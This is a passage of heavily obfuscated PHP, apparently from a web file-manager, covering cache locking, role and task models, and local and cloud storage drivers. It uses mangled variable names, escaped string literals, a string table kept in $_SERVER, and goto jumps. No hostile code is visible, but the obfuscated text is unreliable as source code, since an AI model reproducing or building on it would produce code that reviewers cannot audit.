$éÙê×ğÆ[975]; return file_exists($Í¸İ¶‚); } public function unlock($Ò§«çÃü) { $çã«¿Ê =& $_SERVER[áäÒ½¯Ç]; $‰²ï©ÙÈ = self::$caches[$Ò§«çÃü]; if (!$‰²ï©ÙÈ) { return; } @flock($‰²ï©ÙÈ[$çã«¿Ê[980]], LOCK_UN); @fclose($‰²ï©ÙÈ[$çã«¿Ê[980]]); @unlink($‰²ï©ÙÈ[$çã«¿Ê[241]]); unset(self::$caches[$Ò§«çÃü]); } } class CacheLockRedis { public function lock($ıå¼õöÕ, $–¬¯ß¶ = 10) { $¬„›Óßâ = Cache::init(); $ü—³Éû· = microtime(!0) + $–¬¯ß¶; while (microtime(!0) < $ü—³Éû·) { $ƒ»ĞÁŒ = $¬„›Óßâ->get($ıå¼õöÕ); if (!$ƒ»ĞÁŒ) { $ˆ™üı®® = $¬„›Óßâ->setLock($ıå¼õöÕ, $ü—³Éû·, $–¬¯ß¶); if ($ˆ™üı®®) { return !0; } } else { if ($ƒ»ĞÁŒ < microtime(!0)) { $¬„›Óßâ->set($ıå¼õöÕ, $ü—³Éû·, $–¬¯ß¶ * 2); if ($¬„›Óßâ->get($ıå¼õöÕ) === $ƒ»ĞÁŒ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($‹·è©‘£) { return Cache::init()->get($‹·è©‘£); } public function unlock($˜…ëˆˆ) { return Cache::init()->remove($˜…ëˆˆ); } } goto D°äË Œ¹ñ; FÄö‚Ş‚†: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\56\x72\157\x6c\145\114\x69\x73\x74"; public $field = array("\156\141\155\145", "\x61\x75\x74\x68", "\154\141\142\x65\x6c", "\144\x69\163\160\154\x61\171", "\x73\x79\x73\x74\145\x6d", "\144\145\163\x63", "\151\x67\156\157\162\x65\105\x78\164", "\x69\147\156\157\x72\x65\x46\x69\x6c\x65\x53\151\172\145", "\x61\x64\155\151\156\x69\163\164\x72\141\164\x6f\162", "\163\157\162\x74"); public function listData($ñÅÁëú = false, $Œˆçòè = "\163\157\162\164", $—¾Ÿİ­Â = false) { $îÛØé„® =& $_SERVER[áäÒ½¯Ç]; $€“Û¦ë„ = parent::listData($ñÅÁëú, $Œˆçòè, $—¾Ÿİ­Â); if (!$ñÅÁëú) { foreach ($€“Û¦ë„ as $ãúˆÁè• => $¹ØÜÊ) { if ($¹ØÜÊ[$îÛØé„®[2326]] == 1) { $€“Û¦ë„[$ãúˆÁè•][$îÛØé„®[545]] = LNG($îÛØé„®[2616]); } } } return $€“Û¦ë„; } public function update($‹º€ìÖ¢, $ÒÚÇœ®Ì) { $Œ¤À—Èì =& $_SERVER[áäÒ½¯Ç]; $Ê‚ıÈ = parent::listData($‹º€ìÖ¢); $ÜñıÑ´ñ = $this->findByName($ÒÚÇœ®Ì[$Œ¤À—Èì[32]]); if (!$Ê‚ıÈ || $ÜñıÑ´ñ && $ÜñıÑ´ñ[$Œ¤À—Èì[492]] != $Ê‚ıÈ[$Œ¤À—Èì[492]]) { return !1; } if ($ÜñıÑ´ñ[$Œ¤À—Èì[2326]] == 1) { $ÒÚÇœ®Ì = array($Œ¤À—Èì[32] => $ÒÚÇœ®Ì[$Œ¤À—Èì[32]], $Œ¤À—Èì[2154] => $ÒÚÇœ®Ì[$Œ¤À—Èì[2154]]); } $this->filterAuth($ÒÚÇœ®Ì[$Œ¤À—Èì[507]]); return parent::update($‹º€ìÖ¢, $ÒÚÇœ®Ì); } public function remove($ê­áõ†) { $„ó—Œ¢º = parent::listData($ê­áõ†); if (!$„ó—Œ¢º || $„ó—Œ¢º[$_SERVER[áäÒ½¯Ç][190]]) { return !1; } return parent::remove($ê­áõ†); } public function add($şÆ´°ÅÓ) { $İ‰¨Í´© =& $_SERVER[áäÒ½¯Ç]; $Å›²À¹› = $şÆ´°ÅÓ[$İ‰¨Í´©[32]]; if ($this->findByName($Å›²À¹›)) { return !1; } $Õ˜ Õñä = array($İ‰¨Í´©[514] => $Å›²À¹›, $İ‰¨Í´©[2139] => $İ‰¨Í´©[12], $İ‰¨Í´©[2135] => $İ‰¨Í´©[2143], $İ‰¨Í´©[2617] => 1, $İ‰¨Í´©[2138] => 0, $İ‰¨Í´©[2618] => 0, $İ‰¨Í´©[2137] => $this->getSort()); $şÆ´°ÅÓ = array_merge($Õ˜ Õñä, $şÆ´°ÅÓ); $this->filterAuth($şÆ´°ÅÓ[$İ‰¨Í´©[507]]); return parent::insert($şÆ´°ÅÓ); } private function getSort() { $ˆçÆ´š =& $_SERVER[áäÒ½¯Ç]; $áÄ‹ğ´¹ = parent::listData(); $×ËáıëŠ = array_to_keyvalue($áÄ‹ğ´¹, $ˆçÆ´š[12], $ˆçÆ´š[2155]); return empty($×ËáıëŠ) ? 0 : max($×ËáıëŠ) + 1; } private function filterAuth(&$ÍˆÚ°êê) { $ÇõÄ¬×õ =& $_SERVER[áäÒ½¯Ç]; $ø¦üÇöÂ = array(); $ŞóŒ§…‘ = array_filter(explode($ÇõÄ¬×õ[50], $ÍˆÚ°êê)); foreach ($ŞóŒ§…‘ as $ÍˆÚ°êê) { $Ø¿˜±Ş… = explode($ÇõÄ¬×õ[10], $ÍˆÚ°êê); if ($Ø¿˜±Ş…[0] == $ÇõÄ¬×õ[2619] && $Ø¿˜±Ş…[1] != $ÇõÄ¬×õ[1255]) { $»÷ï…†” = $Ø¿˜±Ş…[0] . $ÇõÄ¬×õ[10] . $Ø¿˜±Ş…[1] . $ÇõÄ¬×õ[2620]; if (!in_array($»÷ï…†”, $ŞóŒ§…‘)) { $ø¦üÇöÂ[] = $»÷ï…†”; } } $ø¦üÇöÂ[] = $ÍˆÚ°êê; } $ÍˆÚ°êê = implode($ÇõÄ¬×õ[50], $ø¦üÇöÂ); } public function findRoleDefault() { $í§½Äè =& $_SERVER[áäÒ½¯Ç]; $¥¯ÆÆÃß = parent::listData(); $Î·îÆÈÙ = !1; foreach ($¥¯ÆÆÃß as $Ğá®×¢Ã) { if (!$Ğá®×¢Ã || $Ğá®×¢Ã[$í§½Äè[2153]] == $í§½Äè[239] || $Ğá®×¢Ã[$í§½Äè[2326]] == 1) { continue; } if (strstr($Ğá®×¢Ã[$í§½Äè[507]], $í§½Äè[2621])) { continue; } if (!strstr($Ğá®×¢Ã[$í§½Äè[507]], $í§½Äè[2622])) { continue; } if (!$Î·îÆÈÙ) { $Î·îÆÈÙ = $Ğá®×¢Ã; continue; } $³¿‹ªùì = explode($í§½Äè[50], $Î·îÆÈÙ[$í§½Äè[507]]); $€ÚĞòÄ = explode($í§½Äè[50], $Ğá®×¢Ã[$í§½Äè[507]]); if (count($³¿‹ªùì) > count($€ÚĞòÄ)) { $Î·îÆÈÙ = $Ğá®×¢Ã; } } return $Î·îÆÈÙ ? $Î·îÆÈÙ[$í§½Äè[492]] : $í§½Äè[12]; } public function sort($³ü•âø, $üÍ²»¸ò) { return parent::update($³ü•âø, $üÍ²»¸ò); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\56\x74\x61\x73\x6b\114\151\x73\164"; public $field = array("\x6e\141\x6d\x65", "\x74\x79\x70\145", "\x65\166\x65\x6e\x74", "\164\x69\155\145", "\x64\145\x73\x63", "\163\x79\x73\x74\x65\155", "\145\x6e\141\142\x6c\x65", "\x6c\x61\x73\164\122\x75\156", "\x73\157\162\x74"); public function listData($ÄùÏÑ‹É = false, $‚äÎ¥ƒ = "\x73\157\x72\164", $ï½û‡ = false) { return parent::listData($ÄùÏÑ‹É, $‚äÎ¥ƒ, $ï½û‡); } public function add($Ÿ“Íã––) { $æÇî™ê =& $_SERVER[áäÒ½¯Ç]; $ÇØì«¬‡ = $this->findByName($Ÿ“Íã––[$æÇî™ê[32]]); if ($ÇØì«¬‡) { return !1; } $Ÿ“Íã––[$æÇî™ê[1878]] = 0; $Ÿ“Íã––[$æÇî™ê[2155]] = $this->getSort(); return parent::insert($Ÿ“Íã––); } private function getSort() { $»æ«òÀ‘ =& $_SERVER[áäÒ½¯Ç]; $êÕñø­š = parent::listData(); $ñçôêôû = array_to_keyvalue($êÕñø­š, $»æ«òÀ‘[12], $»æ«òÀ‘[2155]); return empty($ñçôêôû) ? 0 : max($ñçôêôû) + 1; } public function update($èÔÀäïß, $Ì´Æ³„Ú) { $Ä­¬ª =& $_SERVER[áäÒ½¯Ç]; $äë„øªÀ = $this->listData($èÔÀäïß); $ĞÔÖÓÃ÷ = $this->findByName($Ì´Æ³„Ú[$Ä­¬ª[32]]); if (!$äë„øªÀ || $ĞÔÖÓÃ÷ && $ĞÔÖÓÃ÷[$Ä­¬ª[492]] != $äë„øªÀ[$Ä­¬ª[492]]) { return !1; } return parent::update($èÔÀäïß, $Ì´Æ³„Ú); } public function remove($¦ÅÂÑ…Ü, $ù—Ô±ˆ³ = false) { $¾‰Ş›ÀŠ =& $_SERVER[áäÒ½¯Ç]; $´ÉÅŠ¯ë = $this->listData($¦ÅÂÑ…Ü); if (!$´ÉÅŠ¯ë) { return; } if (!$ù—Ô±ˆ³ && $´ÉÅŠ¯ë[$¾‰Ş›ÀŠ[190]] == $¾‰Ş›ÀŠ[91]) { return !1; } return parent::remove($¦ÅÂÑ…Ü); } public function enable($¢ÊµŸò¡, $—‹¤õöë) { return $this->update($¢ÊµŸò¡, array($_SERVER[áäÒ½¯Ç][2611] => $—‹¤õöë)); } public function run($â–ßòæ) { return $this->update($â–ßòæ, array($_SERVER[áäÒ½¯Ç][2623] => time())); } } goto FóÄï´³ğ; Cå‘¸¤’ô©: class PathDriverJOS extends PathDriverBaseS3 { public function __construct($çÇ’Û©¯) { parent::__construct($çÇ’Û©¯); $this->setSignVersion($_SERVER[áäÒ½¯Ç][258]); } public function uploadLink($ËØªÑÑ×, $Ã‘Æü³Ö = 0) { $ÛÇ¼¤ƒ =& $_SERVER[áäÒ½¯Ç]; if ($this->isUploadServer()) { return; } $„ÁïÖ–ë = $this->getType(); if (!in_array($„ÁïÖ–ë, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ÜƒçÃíÍ = (!$Ã‘Æü³Ö ? 1 : ceil($Ã‘Æü³Ö / pow(1024, 3))) * 3600 * 4; $öÙ‘«³ = $this->uploadMultiData($ËØªÑÑ×, $ÜƒçÃíÍ); if ($öÙ‘«³) { $öÙ‘«³[$ÛÇ¼¤ƒ[95]] = $ËØªÑÑ×; $öÙ‘«³[$ÛÇ¼¤ƒ[96]] = $„ÁïÖ–ë; } return $öÙ‘«³; } public function fileOutImage($¶—¾ô«›, $ÆÛóıØ½ = 250) { if ($this->size($¶—¾ô«›) > 1024 * 1024 * 25) { return $this->fileOutImageServer($¶—¾ô«›, $ÆÛóıØ½); } $‘ÛİÒÖ¤ = $this->link($¶—¾ô«›); $‘ÛİÒÖ¤ .= $_SERVER[áäÒ½¯Ç][1610] . $ÆÛóıØ½; $this->fileOutLink($‘ÛİÒÖ¤); } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($‡°Ô“îâ) { if (substr($‡°Ô“îâ, 0, 2) == $_SERVER[áäÒ½¯Ç][1472]) { $‡°Ô“îâ = BASIC_PATH . substr($‡°Ô“îâ, 2); } return $‡°Ô“îâ; } public function iconvApp($ŞíÅû«ú) { $¤¡Ø‚ïÅ =& $_SERVER[áäÒ½¯Ç]; global $config; return $this->iconvTo($ŞíÅû«ú, $config[$¤¡Ø‚ïÅ[1596]], $config[$¤¡Ø‚ïÅ[1595]]); } public function iconvSystem($ü…ë—şÁ) { $ôÌÊ‰‰ç =& $_SERVER[áäÒ½¯Ç]; global $config; return $this->iconvTo($ü…ë—şÁ, $config[$ôÌÊ‰‰ç[1595]], $config[$ôÌÊ‰‰ç[1596]]); } public function getPathOuter($…É™„¥š) { $½ÄË–éÎ =& $_SERVER[áäÒ½¯Ç]; $ÌÛâ³¸œ = $this->iconvApp($this->pathBase); $…É™„¥š = $this->iconvApp($…É™„¥š); if (substr($ÌÛâ³¸œ, 0, 2) == $½ÄË–éÎ[1472]) { $ÌÛâ³¸œ = BASIC_PATH . substr($ÌÛâ³¸œ, 2); } if (substr($…É™„¥š, 0, 2) == $½ÄË–éÎ[1472]) { $…É™„¥š = BASIC_PATH . substr($…É™„¥š, 2); } $ÌÛâ³¸œ = KodIO::clear($ÌÛâ³¸œ); $…É™„¥š = KodIO::clear($…É™„¥š); $…É™„¥š = substr($…É™„¥š, strlen($ÌÛâ³¸œ)); if (empty($this->pathDriver)) { return $…É™„¥š; } return $this->pathDriver . $½ÄË–éÎ[8] . ltrim($…É™„¥š, $½ÄË–éÎ[8]); } public function mkfile($œä ğ‰‡, $Ú½ŠÎ¶È = '', $Ùëßşı = REPEAT_RENAME) { $œä ğ‰‡ = $this->iconvSystem($œä ğ‰‡); @touch($œä ğ‰‡); if ($Ú½ŠÎ¶È) { file_put_contents($œä ğ‰‡, $Ú½ŠÎ¶È); } @chmod($œä ğ‰‡, $this->pathAuth); if (is_file($œä ğ‰‡)) { return $this->getPathOuter($œä ğ‰‡); } $this->writeLog(__FUNCTION__ . $_SERVER[áäÒ½¯Ç][1607], !0); return !1; } public function mkdir($Èêò‰ëç, $Ò´ÒØ± = REPEAT_SKIP) { $Èêò‰ëç = $this->iconvSystem($Èêò‰ëç); if (is_dir($Èêò‰ëç)) { return $this->getPathOuter($Èêò‰ëç); } @mkdir($Èêò‰ëç, $this->pathAuth, !0); @chmod($Èêò‰ëç, $this->pathAuth); if (is_dir($Èêò‰ëç)) { return $this->getPathOuter($Èêò‰ëç); } $this->writeLog(__FUNCTION__ . $_SERVER[áäÒ½¯Ç][1607], !0); return !1; } public function copyFile($ÑŒ£‚, $‡¶€ß³) { $this->mkdir($this->pathFather($‡¶€ß³)); $ÑŒ£‚ = $this->iconvSystem($ÑŒ£‚); $‡¶€ß³ = $this->iconvSystem($‡¶€ß³); $ÅöÉ“êû = copy_64($ÑŒ£‚, $‡¶€ß³); @chmod($‡¶€ß³, $this->pathAuth); if ($ÅöÉ“êû) { return $this->getPathOuter($‡¶€ß³); } $this->writeLog(__FUNCTION__ . $_SERVER[áäÒ½¯Ç][1607], !0); return !1; } public function moveFile($åîÚîÍ, $”ĞûÛ‘à) { $this->mkdir($this->pathFather($”ĞûÛ‘à)); $åîÚîÍ = $this->iconvSystem($åîÚîÍ); $”ĞûÛ‘à = $this->iconvSystem($”ĞûÛ‘à); $ÈƒÜÎÙ‹ = intval(@rename($åîÚîÍ, $”ĞûÛ‘à)); if (!$ÈƒÜÎÙ‹) { if ($ÈƒÜÎÙ‹ = intval(@copy_64($åîÚîÍ, $”ĞûÛ‘à))) { @unlink($åîÚîÍ); } } @chmod($”ĞûÛ‘à, $this->pathAuth); if ($ÈƒÜÎÙ‹) { return $this->getPathOuter($”ĞûÛ‘à); } $this->writeLog(__FUNCTION__ . $_SERVER[áäÒ½¯Ç][1607], !0); return !1; } public function movePath($ı°‡åò”, $„ˆÌ”×, $Æƒ¾µğŠ = false) { $¿Åìı‚ =& $_SERVER[áäÒ½¯Ç]; $ı°‡åò” = $this->iconvSystem($ı°‡åò”); $„ˆÌ”× = $this->iconvSystem($„ˆÌ”×); $°¬ª°¤ = rtrim($„ˆÌ”×, $¿Åìı‚[8]) . $¿Åìı‚[8] . ($Æƒ¾µğŠ ? $Æƒ¾µğŠ : get_path_this($ı°‡åò”)); if (file_exists($°¬ª°¤)) { return !1; } $ÔòÎŞÔ† = intval(@rename($ı°‡åò”, $°¬ª°¤)); $ÔòÎŞÔ† = file_exists($°¬ª°¤); if ($ÔòÎŞÔ†) { return $this->getPathOuter($°¬ª°¤); } $this->writeLog(__FUNCTION__ . $¿Åìı‚[1607], !0); return !1; } public function delFile($ëİğ¢ŸÎ) { $ëİğ¢ŸÎ = $this->iconvSystem($ëİğ¢ŸÎ); if (!@unlink($ëİğ¢ŸÎ)) { @chmod($ëİğ¢ŸÎ, $this->pathAuth); if (@unlink($ëİğ¢ŸÎ)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[áäÒ½¯Ç][1607], !0); return !1; } return !0; } public function delFolder($ÁÇ¸ÊŸ ) { $¿¯½¼ˆ =& $_SERVER[áäÒ½¯Ç]; $ÁÇ¸ÊŸ  = $this->iconvSystem($ÁÇ¸ÊŸ ); if (!is_dir($ÁÇ¸ÊŸ )) { return !0; } if (!($óËÄº¤× = opendir($ÁÇ¸ÊŸ ))) { return !1; } while (($²‰÷ÜŠô = readdir($óËÄº¤×)) !== !1) { if ($²‰÷ÜŠô == $¿¯½¼ˆ[10] || $²‰÷ÜŠô == $¿¯½¼ˆ[1417]) { continue; } $É‡¶ÍĞ¦ = $ÁÇ¸ÊŸ  . $¿¯½¼ˆ[8] . $²‰÷ÜŠô; if (is_file($É‡¶ÍĞ¦) || is_link($É‡¶ÍĞ¦)) { if (!unlink($É‡¶ÍĞ¦)) { chmod($É‡¶ÍĞ¦, $this->pathAuth); if (!unlink($É‡¶ÍĞ¦)) { return !1; } } } else { if (is_dir($É‡¶ÍĞ¦)) { chmod($É‡¶ÍĞ¦, $this->pathAuth); $É‡¶ÍĞ¦ = $this->iconvApp($É‡¶ÍĞ¦); if (!$this->delFolder($É‡¶ÍĞ¦)) { return !1; } } } } closedir($óËÄº¤×); return rmdir($ÁÇ¸ÊŸ ); } public function rename($š³ó°¬Ø, $¢½ôÛ½Û) { $ìá€Á˜­ =& $_SERVER[áäÒ½¯Ç]; $‹ –Ÿ­ = $this->fileNameAuto($this->pathFather($š³ó°¬Ø), $¢½ôÛ½Û); $‹ –Ÿ­ = $this->iconvSystem($‹ –Ÿ­); $š³ó°¬Ø = $this->iconvSystem($š³ó°¬Ø); $ÃóÆ®Ûğ = $this->pathFather($š³ó°¬Ø); $±ıº×©ğ = rtrim($ÃóÆ®Ûğ, $ìá€Á˜­[8]) . $ìá€Á˜­[8] . $‹ –Ÿ­; $œåç©À = @rename($š³ó°¬Ø, $±ıº×©ğ); $±ıº×©ğ = $this->iconvApp($±ıº×©ğ); if ($œåç©À) { return $this->getPathOuter($±ıº×©ğ); } $this->writeLog(__FUNCTION__ . $ìá€Á˜­[1607], !0); return !1; } public function size($õ¯¡û×ì) { $õ¯¡û×ì = $this->iconvSystem($õ¯¡û×ì); return filesize_64($õ¯¡û×ì); } public function info($ßú»ˆ‰İ) { $ßú»ˆ‰İ = $this->iconvSystem($ßú»ˆ‰İ); if ($this->isFolder($ßú»ˆ‰İ)) { return $this->folderInfo($ßú»ˆ‰İ); } else { if ($this->isFile($ßú»ˆ‰İ)) { return $this->fileInfo($ßú»ˆ‰İ); } } return !1; } protected function infoChildren($¹ïşØ´¯, &$ñœÔÖï, $ôÇéüØá = true) { $Ÿ‘Á‰¡¶ =& $_SERVER[áäÒ½¯Ç]; check_abort_echo(); $¹ïşØ´¯ = rtrim($¹ïşØ´¯, $Ÿ‘Á‰¡¶[8]) . $Ÿ‘Á‰¡¶[8]; if ($ôÇéüØá) { $¹ïşØ´¯ = $this->iconvSystem($¹ïşØ´¯); } if (!($œ¬ƒóüÛ = @opendir($¹ïşØ´¯))) { return; } while (($¯İ€¯î = readdir($œ¬ƒóüÛ)) !== !1) { if ($¯İ€¯î == $Ÿ‘Á‰¡¶[10] || $¯İ€¯î == $Ÿ‘Á‰¡¶[1417]) { continue; } $ÇíîÛáÎ = $¹ïşØ´¯ . $¯İ€¯î; if (is_file($ÇíîÛáÎ) || is_link($ÇíîÛáÎ)) { $ñœÔÖï[$Ÿ‘Á‰¡¶[80]]++; $ñœÔÖï[$Ÿ‘Á‰¡¶[79]] += filesize_64($ÇíîÛáÎ); } else { if (is_dir($ÇíîÛáÎ)) { $ñœÔÖï[$Ÿ‘Á‰¡¶[81]]++; $this->infoChildren($ÇíîÛáÎ, $ñœÔÖï, !1); } } } closedir($œ¬ƒóüÛ); } private function folderInfo($†©É÷¤¨, $„ŞßÓœ” = false) { $’ş‘—Ôµ =& $_SERVER[áäÒ½¯Ç]; $†©É÷¤¨ = rtrim($†©É÷¤¨, $’ş‘—Ôµ[8]) . $’ş‘—Ôµ[8]; $Ÿ‰çŠ Æ = $this->iconvApp($this->pathThis($†©É÷¤¨)); if ($„ŞßÓœ”) { return array($’ş‘—Ôµ[32] => $Ÿ‰çŠ Æ, $’ş‘—Ôµ[87] => $this->getPathOuter($†©É÷¤¨), $’ş‘—Ôµ[33] => $’ş‘—Ôµ[78]); } $µ­Š”œı = array($’ş‘—Ôµ[32] => $Ÿ‰çŠ Æ, $’ş‘—Ôµ[87] => $this->getPathOuter($†©É÷¤¨), $’ş‘—Ôµ[33] => $’ş‘—Ôµ[78], $’ş‘—Ôµ[242] => @filectime($†©É÷¤¨), $’ş‘—Ôµ[88] => @filemtime($†©É÷¤¨), $’ş‘—Ôµ[1611] => @fileatime($†©É÷¤¨), $’ş‘—Ôµ[1612] => is_readable($†©É÷¤¨), $’ş‘—Ôµ[1613] => is_writable($†©É÷¤¨), $’ş‘—Ôµ[1614] => get_mode($†©É÷¤¨)); return $µ­Š”œı; } private function fileInfo($œ«¯å­¨, $İÔ¬Îë™ = false) { $‡¿öıùÇ =& $_SERVER[áäÒ½¯Ç]; $ü¤÷‘Œ¶ = $this->iconvApp($this->pathThis($œ«¯å­¨)); if ($İÔ¬Îë™) { return array($‡¿öıùÇ[32] => $ü¤÷‘Œ¶, $‡¿öıùÇ[87] => $this->getPathOuter($œ«¯å­¨), $‡¿öıùÇ[33] => $‡¿öıùÇ[241], $‡¿öıùÇ[79] => $this->size($œ«¯å­¨), $‡¿öıùÇ[167] => $this->ext($ü¤÷‘Œ¶)); } $ÆĞÀŞÇ› = array($‡¿öıùÇ[32] => $ü¤÷‘Œ¶, $‡¿öıùÇ[87] => $this->getPathOuter($œ«¯å­¨), $‡¿öıùÇ[33] => $‡¿öıùÇ[241], $‡¿öıùÇ[242] => @filectime($œ«¯å­¨), $‡¿öıùÇ[88] => @filemtime($œ«¯å­¨), $‡¿öıùÇ[1611] => @fileatime($œ«¯å­¨), $‡¿öıùÇ[79] => $this->size($œ«¯å­¨), $‡¿öıùÇ[167] => $this->ext($ü¤÷‘Œ¶), $‡¿öıùÇ[1612] => is_readable($œ«¯å­¨), $‡¿öıùÇ[1613] => is_writable($œ«¯å­¨), $‡¿öıùÇ[1614] => get_mode($œ«¯å­¨)); return $ÆĞÀŞÇ›; } public function exist($Œ‡À×›ä) { $Œ‡À×›ä = $this->iconvSystem($Œ‡À×›ä); return @file_exists($Œ‡À×›ä); } public function isFile($‹„ª€ú«) { $‹„ª€ú« = $this->iconvSystem($‹„ª€ú«); return @is_file($‹„ª€ú«); } public function isFolder($“½“ü–) { $“½“ü– = $this->iconvSystem($“½“ü–); return @is_dir($“½“ü–); } public function listPath($ï¦ÕØœ£, $á½óæó = false) { $¿ú†ì“ =& $_SERVER[áäÒ½¯Ç]; $ï¦ÕØœ£ = $this->iconvSystem($ï¦ÕØœ£); $ï¦ÕØœ£ = rtrim($ï¦ÕØœ£, $¿ú†ì“[8]) . $¿ú†ì“[8]; $ğÜü°¸ú = array($¿ú†ì“[85] => array(), $¿ú†ì“[86] => array()); if (!($Ù£“Ç¬ß = @opendir($ï¦ÕØœ£))) { return $ğÜü°¸ú; } while (($ñŞÄ•Û = readdir($Ù£“Ç¬ß)) !== !1) { if ($ñŞÄ•Û == $¿ú†ì“[10] || $ñŞÄ•Û == $¿ú†ì“[1417]) { continue; } $”ãËÙõ® = $ï¦ÕØœ£ . $ñŞÄ•Û; if (is_file($”ãËÙõ®)) { $ğÜü°¸ú[$¿ú†ì“[86]][] = $this->fileInfo($”ãËÙõ®, $á½óæó); } else { $ğÜü°¸ú[$¿ú†ì“[85]][] = $this->folderInfo($”ãËÙõ®, $á½óæó); } } closedir($Ù£“Ç¬ß); return $ğÜü°¸ú; } public function listAll($À»é¡Ù‰, &$¾±œ¨°„ = array()) { $¢©«÷ªŸ =& $_SERVER[áäÒ½¯Ç]; $À»é¡Ù‰ = $this->iconvSystem($À»é¡Ù‰); $À»é¡Ù‰ = rtrim($À»é¡Ù‰, $¢©«÷ªŸ[8]) . $¢©«÷ªŸ[8]; if (!($ãíí³ŒÌ = @opendir($À»é¡Ù‰))) { return $¾±œ¨°„; } while (($µ²–“¦ = readdir($ãíí³ŒÌ)) !== !1) { if ($µ²–“¦ == $¢©«÷ªŸ[10] || $µ²–“¦ == $¢©«÷ªŸ[1417]) { continue; } $»ç©… = $À»é¡Ù‰ . $µ²–“¦; $¸‚¡Ûî‘ = is_dir($»ç©…) && !is_link($»ç©…) ? 1 : 0; $»ç©… = $¸‚¡Ûî‘ ? $»ç©… . $¢©«÷ªŸ[8] : $»ç©…; $¾±œ¨°„[] = array($¢©«÷ªŸ[87] => $this->getPathOuter($»ç©…), $¢©«÷ªŸ[78] => $¸‚¡Ûî‘, $¢©«÷ªŸ[88] => intval(@filemtime($»ç©…)), $¢©«÷ªŸ[79] => $¸‚¡Ûî‘ ? 0 : intval($this->size($»ç©…))); if ($¸‚¡Ûî‘) { $this->listAll($»ç©…, $¾±œ¨°„); } } closedir($ãíí³ŒÌ); return $¾±œ¨°„; } public function has($¬ÜÃä÷˜, $æØ×Ä¢ = false, $îŸÊ‘æ² = true) { $üÏ•òÖ =& $_SERVER[áäÒ½¯Ç]; $¬ÜÃä÷˜ = $this->iconvSystem($¬ÜÃä÷˜); $¬ÜÃä÷˜ = rtrim($¬ÜÃä÷˜, $üÏ•òÖ[8]) . $üÏ•òÖ[8]; if (!($Œì¯¶¿ê = @opendir($¬ÜÃä÷˜))) { return !1; } $“æÕŠ÷µ = 0; $ÇÔ¿¿öã = 0; $¢‰Á§¸½ = 0; while (($ï¯Ÿ‘ğÇ = readdir($Œì¯¶¿ê)) !== !1) { if ($ï¯Ÿ‘ğÇ == $üÏ•òÖ[10] || $ï¯Ÿ‘ğÇ == $üÏ•òÖ[1417]) { continue; } $ƒÜ–¥Üæ = $¬ÜÃä÷˜ . $ï¯Ÿ‘ğÇ; if ($æØ×Ä¢) { $¢‰Á§¸½++; if (@is_file($ƒÜ–¥Üæ)) { $“æÕŠ÷µ++; } else { $ÇÔ¿¿öã++; } if ($¢‰Á§¸½ > 10000) { break; } continue; } if ($îŸÊ‘æ²) { if (@is_file($ƒÜ–¥Üæ)) { return !0; } } else { if (@is_dir($ƒÜ–¥Üæ . $üÏ•òÖ[8])) { return !0; } } } closedir($Œì¯¶¿ê); if ($æØ×Ä¢) { return array($üÏ•òÖ[250] => $“æÕŠ÷µ, $üÏ•òÖ[251] => $ÇÔ¿¿öã); } return !1; } public function hashSimple($è÷•¥÷ç) { $ğâ…Àå =& $_SERVER[áäÒ½¯Ç]; if (!$è÷•¥÷ç) { return md5($ğâ…Àå[12]); } $è÷•¥÷ç = $this->iconvSystem($è÷•¥÷ç); $Ú¶Ãš‘å = $this->size($è÷•¥÷ç); $²èèŠ¾ = 200; $ÊÊ¿’Ğ½ = 50; if ($Ú¶Ãš‘å <= $²èèŠ¾ * $ÊÊ¿’Ğ½) { return $this->hashMd5($è÷•¥÷ç) . $Ú¶Ãš‘å; } $üù«û±é = $ğâ…Àå[12]; $ĞŸå‚Ô» = intval($Ú¶Ãš‘å / $ÊÊ¿’Ğ½); $«²æ´İé = fopen($è÷•¥÷ç, $ğâ…Àå[1615]); if (!$«²æ´İé) { return $üù«û±é; } for ($¡İ–Ùñ = 0; $¡İ–Ùñ < $ÊÊ¿’Ğ½; $¡İ–Ùñ++) { fseek_64($«²æ´İé, $ĞŸå‚Ô» * $¡İ–Ùñ); $üù«û±é .= fread($«²æ´İé, $²èèŠ¾); } fseek_64($«²æ´İé, $Ú¶Ãš‘å - $²èèŠ¾); $üù«û±é .= fread($«²æ´İé, $²èèŠ¾); fclose($«²æ´İé); return md5($üù«û±é) . $Ú¶Ãš‘å; } public function getContent($ÑÊ­Œõ) { $ÑÊ­Œõ = $this->iconvSystem($ÑÊ­Œõ); return file_get_contents($ÑÊ­Œõ); } public function setContent($ıÑÄüë, $ì¾ß©« = '') { $ıÑÄüë = $this->iconvSystem($ıÑÄüë); $ÏÒíìÖ = @file_put_contents($ıÑÄüë, $ì¾ß©«, LOCK_EX); if (!$ÏÒíìÖ) { $this->writeLog(__FUNCTION__ . $_SERVER[áäÒ½¯Ç][1607], !0); } clearstatcache(); @chmod($ıÑÄüë, $this->pathAuth); return $ÏÒíìÖ === !1 ? !1 : !0; } public function fileSubstr($ç‘Ò³ÚÜ, $ğ›‡…Õ = 0, $ËïŒ¹›Ä = false) { $ñÎšü¦ =& $_SERVER[áäÒ½¯Ç]; $ç‘Ò³ÚÜ = $this->iconvSystem($ç‘Ò³ÚÜ); if ($ËïŒ¹›Ä === !1) { $ËïŒ¹›Ä = $this->size($ç‘Ò³ÚÜ); } if ($ËïŒ¹›Ä <= 0) { return $ñÎšü¦[12]; } $™Õ¹Î€ì = fopen($ç‘Ò³ÚÜ, $ñÎšü¦[1615]); if (!$™Õ¹Î€ì) { return !1; } fseek_64($™Õ¹Î€ì, $ğ›‡…Õ); $áğÒ´öì = fread($™Õ¹Î€ì, $ËïŒ¹›Ä); fclose($™Õ¹Î€ì); if (!$áğÒ´öì) { $this->writeLog(__FUNCTION__ . $ñÎšü¦[1607], !0); } return $áğÒ´öì; } public function upload($áí¥îÉ, $ğ’ğ«ñ, $ÁÄ±®ë© = false, $Ôö„Ùòß = REPEAT_REPLACE) { if (!$ğ’ğ«ñ || !@file_exists($ğ’ğ«ñ)) { return !1; } if ($ÁÄ±®ë©) { return $this->moveFile($ğ’ğ«ñ, $áí¥îÉ); } return $this->copyFile($ğ’ğ«ñ, 